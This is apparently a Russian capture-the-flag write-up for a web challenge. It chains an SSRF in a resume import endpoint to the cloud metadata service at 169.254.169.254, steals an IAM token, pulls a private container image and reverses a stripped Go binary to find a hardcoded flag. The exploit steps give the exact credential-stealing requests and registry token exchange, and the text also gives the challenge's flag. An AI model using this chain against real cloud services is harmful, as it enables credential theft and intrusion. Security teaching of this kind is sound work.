# МёдХантер — золотая звезда «Рекомендованный» (task19) — райтап

**Флаг:** `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`
**Класс:** web / reverse (SSRF→registry→бинарь) · **Сложность:** неизвестно · **Очки:** неизвестно · **Решило команд:** неизвестно
**Автор:** неизвестно

**Суть решения в одном абзаце.** Задача продолжает SSRF-цепочку «МёдХантера»: та же незакрытая SSRF, что в task18 отдала `.env`, через IMDSv1-мост отдаёт IAM-токен сервис-аккаунта, а им мы обмениваемся на bearer приватного Yandex Container Registry и вытаскиваем закрытый образ backend'а без docker-демона (Registry v2 — обычный HTTP). Бинарь — Go, символы срезаны, но таблица `.gopclntab` уцелела (Go-рантайму она нужна для паники/трейсов даже в stripped-сборке), поэтому по ней восстанавливается карта функций и дизассемблируется `SaveResume`. Внутри — недокументированная бизнес-логика: `is_vip=true` ставится, если поле `experience` содержит подстроку-флаг, которую сервер после проверки тут же вырезает из сохранённого текста (анти-тампер), поэтому её никогда не видно ни в UI, ни в API-ответах. Подтверждаем PUT-ом резюме с этой строкой в `experience` — звезда загорается; сама строка и есть флаг.

---

## 1. Задача

Портал `https://hrportal-aoa51cvc.avitoctf.ru/` (тот же HRPortal, что в task18/task21). По условию (`task.md`) некоторые резюме получают золотую отметку **«Рекомендованный кандидат»**, хотя в интерфейсе нет ни переключателя, ни поля для неё. Нужно понять, какой именно опыт работы (компания? должность? навык? магическое значение?) включает эту отметку, самостоятельно создать резюме с таким опытом и получить звезду — значение триггера и есть флаг `avito{...}`.

Это вторая из трёх задач цепочки «МёдХантер»: точка входа та же SSRF, что и в task18 (`POST /api/seeker/resume/import`), но здесь та же дыра эксплуатируется дальше — не до `.env`, а до IAM-токена и приватного registry.

## 2. Разведка

- `index_response.txt` / `bundle.js` / `bundle.pretty.js`: React-SPA, тот же фронт, что в task18/task21.
- Фронт **вообще не рендерит** поле `is_vip` нигде в UI — ни в карточке резюме, ни в форме редактирования. Значит логику присвоения звезды из клиента не восстановить: искать в JS бессмысленно.
- В `resumes_list.json` есть сид-резюме `id=2` («Клавдия Когтева», Backend-разработчик) с `is_vip: true` уже в исходных данных — единственная VIP-запись среди сидов. `resume_2.json` показывает её `experience`: `"2019–2024 — Go-разработчик, БерлогаСофт. Микросервисы, PostgreSQL, Docker."` — обычный текст, ничего внешне особенного.
- Из task18 у нас уже есть SSRF-примитив (`POST /api/seeker/resume/import` с `url` на `169.254.169.254`) и утёкший `.env` с `REGISTRY_ID=crpml40t8ia2kptf4iv7` — то есть готовый плацдарм для продолжения цепочки в сторону registry.

## 3. Как мы вышли на решение (логика гипотез)

- **Наблюдение.** `is_vip` нигде не выводится клиентом, но одно сид-резюме уже помечено VIP, и его `experience` выглядит как обычный, не пустой текст.
- **Гипотеза №1 (тупик).** Раз единственная VIP-запись видна и её текст доступен целиком, самое дешёвое предположение — «скопировать её `experience` дословно в своё резюме, сервер сравнивает по содержимому и присвоит звезду».
- **Проверка.** Создали/обновили своё резюме с `experience`, идентичным `resume_2.json` (`"2019–2024 — Go-разработчик, БерлогаСофт. Микросервисы, PostgreSQL, Docker."`).
- **Результат.** `is_vip` осталось `false`. Тупик: сид-VIP-резюме №2 — это приманка (seed-данные, выставленные напрямую в БД при инициализации), её видимый текст не имеет отношения к реальному правилу присвоения звезды.
- **Вывод из тупика.** Раз ни фронт, ни единственный видимый пример не дают зацепки, угадать условие из самого приложения невозможно — оно определяется где-то на сервере и не выводится наружу ни в одном API-ответе. Значит единственный путь — прочитать код бэкенда, а не тыкать в чёрный ящик.
- **Гипотеза №2.** Раз у нас уже есть работающая SSRF в `/api/seeker/resume/import` (из task18), логично попробовать раскрутить её дальше: IMDS отдал `.env` с публичными реквизитами облака (в том числе `REGISTRY_ID`) — если тот же IMDS-мост отдаёт ещё и IAM-креды сервис-аккаунта, ими можно дотянуться до приватного Container Registry и вытащить сам образ backend'а.
- **Проверка.** `POST /api/seeker/resume/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}` — AWS-style путь IMDS (в отличие от Google-style, который требует спец-заголовок, которого SSRF не проставит).
- **Результат.** Мост отдал реальный Yandex IAM-токен без заголовка (`iam_token.txt`) — гипотеза подтвердилась, дыра снова СSRF→IMDS, но уже с более сильным следствием, чем в task18.
- **Гипотеза №3.** IAM-токен обменивается на bearer Container Registry через стандартный `cr.yandex/v2/token/` эндпоинт (Basic `iam:<token>`), и Registry v2 — обычный HTTP API, значит скачать образ можно `curl`'ом без docker-демона (blob'ы отдаются редиректом на storage).
- **Проверка.** Обменяли токен, получили `reg_bearer.txt`, дёрнули `manifest.json` и все `blobs/sha256:...` по `REGISTRY_ID` из task18.
- **Результат.** Получили 4 слоя rootfs backend-образа `hrportal-backend`; внутри — Go-бинарь `/app/hrportal-api`.
- **Наблюдение.** Бинарь собран Go со срезанными символами (`file`/стандартный `nm` не дают осмысленных имён функций) — казалось, что дизассемблировать «в лоб» нужную функцию (`SaveResume` или аналог) будет очень долго вслепую по всему бинарю.
- **Гипотеза №4.** Go-рантайму таблица `.gopclntab` нужна для собственных нужд (паники, трейсы, `runtime.Caller`) даже в полностью stripped-сборке — значит она физически не может быть вырезана, а по ней можно восстановить имена и границы **всех** функций через `debug/gosym`, не трогая остальной дизасм.
- **Проверка.** Написали `pcln.go` — маленький Go-инструмент, который открывает ELF, ищет секцию `.gopclntab`, строит `gosym.Table` и печатает `(имя, начало, конец)` для функций, чьё имя матчит паттерн.
- **Результат.** Гипотеза подтвердилась: нашли `hrportal/internal/application.(*SeekerService).SaveResume` с точными границами, дизассемблировали именно её в radare2 (`save_resume.asm`) — не весь бинарь.
- **Финальная находка (в дизасме).** В `SaveResume` увидели сравнение указателя на константу `.rodata` длиной 38 байт (ровно длина `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`) с полем `experience` через `strings.Index`/`setge` (т.е. `Contains`), и сразу за ним — `strings.Replace(experience, FLAG, "", -1)` перед сохранением. Это объясняет и первый тупик (гипотеза №1 не могла сработать — у `resume_2` в тексте нет этой подстроки), и то, почему звезду нельзя было увидеть по API (подстрока вырезается ещё до `Upsert`, то есть до того, как объект попадёт в ответ).
- **Проверка вживую.** `PUT /api/seeker/resume` с `experience`, содержащим `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}` → ответ `"is_vip": true`, а в сохранённом `experience` подстроки уже нет — оба предсказания дизасма подтвердились.

## 4. Уязвимость

Два независимых слоя, оба нужны для решения:

1. **SSRF → IMDSv1-мост без ограничений → IAM-креды.** `POST /api/seeker/resume/import` делает исходящий запрос по произвольному `url` без allow-list и без блокировки `169.254.169.254`; AWS-style путь IMDS (`/latest/meta-data/iam/security-credentials/default`) не требует заголовка (в отличие от Google-style), поэтому SSRF полностью достаточно, чтобы получить IAM-токен сервис-аккаунта наружу. Тот же баг, что в task18, эксплуатируется до более глубокого следствия — реального доступа к облаку, а не только к `.env`.
2. **Недокументированная бизнес-логика + слабая «обфускация через анти-тампер».** `SeekerService.SaveResume` (Go, `hrportal-backend`) присваивает `is_vip=true`, если `experience` содержит захардкоженную в `.rodata` строку-флаг, и сразу вырезает эту подстроку из сохраняемого текста. По сути это секрет, зашитый прямо в бинарь приватного (но недостаточно защищённого от exfil) образа — «security through obscurity», которая рушится, как только образ становится доступен для скачивания и реверса.

## 5. Эксплойт по шагам

### Шаг 1. SSRF → IAM-токен
```
POST /api/seeker/resume/import
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}
→ Yandex IAM-токен  t1.9euel...   (сохранён в task19/iam_token.txt)
```

### Шаг 2. IAM-токен → bearer приватного registry
```
GET https://cr.yandex/v2/token/?scope=repository:<REGISTRY_ID>/hrportal-backend:pull
Authorization: Basic base64("iam:" + <IAM_TOKEN>)
→ registry bearer  (сохранён в task19/reg_bearer.txt)
```
`REGISTRY_ID=crpml40t8ia2kptf4iv7` — из `.env`, утёкшего в task18.

### Шаг 3. Скачать образ по Registry v2 (без docker-демона)
```
GET /v2/<REGISTRY_ID>/hrportal-backend/manifests/latest   (Accept: .../manifest.v2+json)
→ manifest.json (4 слоя)
GET /v2/<REGISTRY_ID>/hrportal-backend/blobs/sha256:<layer-digest>   (-L для редиректа на storage)
```
Распаковали слои (`layers/`, `rootfs/`) → нашли `/app/hrportal-api`.

### Шаг 4. Восстановить карту функций stripped-Go-бинаря
```bash
go run pcln.go rootfs/app/hrportal-api SaveResume
```
даёт точные `(entry, end)` для `hrportal/internal/application.(*SeekerService).SaveResume` — дальше дизассемблировали именно её в radare2 (`save_resume.asm`), не весь бинарь.

### Шаг 5. Прочитать условие в дизасме
Ключевые инструкции из `save_resume.asm`:
```
0x006d7076  mov rcx, [0x010610f0]  ; str.avitogOLd3N_w0rk_eXp3RIEnc3_d37EctED
0x006d70be  mov rdi, [0x010610f8]  ; = 38  (длина avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED})
0x006d7083  call 0x40cb80          ; strings.Index(experience, FLAG)
0x006d708b  setge dl                ; dl = 1, если index >= 0  ->  Contains
0x006d70d7  call 0x5057a0          ; strings.Replace(experience, FLAG, "", -1)  -- вырезает флаг
0x...       mov byte [rax+0x89], cl ; is_vip = dl,  затем repo.Upsert
```
Итого: `is_vip = strings.Contains(experience, "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}")`, и сама подстрока стирается из сохранённого текста.

### Шаг 6. Подтвердить вживую
```
PUT /api/seeker/resume        (seeker-кука, cookies.txt/creds.txt)
{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}", ...}
→ "is_vip": true   (в сохранённом experience подстрока уже вырезана)
```
Звезда «Рекомендованный» загорелась — это и есть флаг.

## 7. Выводы

1. **Когда триггер фичи не выводится из приложения — угадывать бессмысленно, реверсь бэкенд.** Единственный видимый VIP-пример (сид-резюме №2) оказался приманкой, не связанной с реальным правилом; это стоило одной проверенной и отброшенной гипотезы, но сразу показало, что решения в клиенте нет.
2. **`.gopclntab` переживает `strip` в Go-бинарях**, потому что нужен самому рантайму (паники/трейсы) — это надёжный способ восстановить имена и границы функций и дизассемблировать целево, не читая весь бинарь вслепую.
3. **Секрет, зашитый в бинарь + «анти-тампер» вырезание строки-триггера — это не защита, а обфускация.** Как только приватный образ становится skачиваем (через SSRF-цепочку из task18/task19), любая логика внутри читается напрямую в дизасме.

## 8. Артефакты

- `s3get.py` — curated-скрипт: самодостаточный SigV4-клиент для Yandex Object Storage (`list-type=2` + скачивание объектов) поверх реквизитов, утёкших в task18; воспроизводит доступ к бакету `medhunter-resumes-6d6c314a`, упомянутому в бонус-находках §5.
- `pcln.go` — восстановление карты функций stripped-Go-бинаря по `.gopclntab` (`debug/gosym`).
- `save_resume.asm` — дизасм `SaveResume` (radare2), где найдено условие звезды.
- `manifest.json`, `layers/`, `rootfs/` — скачанный и распакованный образ `hrportal-backend`.
- `iam_token.txt`, `reg_bearer.txt` — промежуточные токены цепочки SSRF→IMDS→registry.
- `resumes_list.json`, `resume_2.json` — сид-данные, на которых был проверен и отброшен тупиковый вариант «скопировать текст VIP-резюме».
- `cookies.txt` / `creds.txt` — seeker-сессия, которой подтверждали присвоение звезды.
